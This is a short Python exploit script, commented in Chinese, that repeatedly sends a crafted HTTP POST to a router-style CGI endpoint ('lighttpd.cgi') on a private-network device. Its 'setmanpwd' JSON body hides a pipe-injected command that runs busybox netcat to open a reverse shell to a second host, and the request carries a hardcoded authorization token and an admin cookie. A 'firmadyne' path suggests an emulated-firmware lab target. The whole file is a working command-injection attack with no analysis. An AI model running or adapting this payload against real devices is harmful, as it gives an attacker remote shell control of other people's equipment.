import socket
import time # 导入 time 模块

# 目标设备的IP和端口
target_host = "192.168.242.146"
target_port = 4567

# 构造符合要求的HTTP请求
http_request = (
    "POST /cgi-bin/lighttpd.cgi HTTP/1.1\r\n"
    "Host: 192.168.242.146:4567\r\n"
    "Content-Length: 85\r\n"  # 修正为实际JSON长度
    "Accept: application/json, text/plain, */*\r\n"
    "Authorization: e6134549b502df3372b6402ef29b004d\r\n"
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Origin: http://192.168.242.146:4567\r\n"
    "Referer: http://192.168.242.146:4567/html/index.html\r\n"
    "Accept-Encoding: gzip, deflate\r\n"
    "Accept-Language: zh-CN,zh;q=0.9\r\n"
    "Cookie: user=admin\r\n"
    "Connection: close\r\n"
    "\r\n"
    r'{"type":"setmanpwd","routepwd":"|/firmadyne/busybox nc 192.168.16.2 2333 -e /bin/sh"}'
)

# 设置尝试次数和间隔时间（秒）
num_attempts = 10
interval = 2

# 循环发送请求
for i in range(num_attempts):
    print(f"Attempt {i+1}/{num_attempts}...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # 设置超时时间，避免长时间阻塞
        s.settimeout(5) 
        s.connect((target_host, target_port))
        s.sendall(http_request.encode())
        
        # 可选：尝试接收响应
        try:
            response = s.recv(1024)
            print("Response received:", response.decode())
            # 如果成功接收到响应（即使是错误响应），可能意味着命令已执行，可以考虑退出循环
            # break 
        except socket.timeout:
            print("No response received within timeout.")
        except Exception as e:
            print(f"Error receiving response: {e}")
            
    except socket.timeout:
        print("Connection timed out.")
    except Exception as e:
        print(f"Error sending request: {e}")
    finally:
        if 's' in locals() and s.fileno() != -1:
             s.close()
    
    # 等待指定间隔时间
    if i < num_attempts - 1:
        print(f"Waiting for {interval} seconds...")
        time.sleep(interval)

print("Finished all attempts.")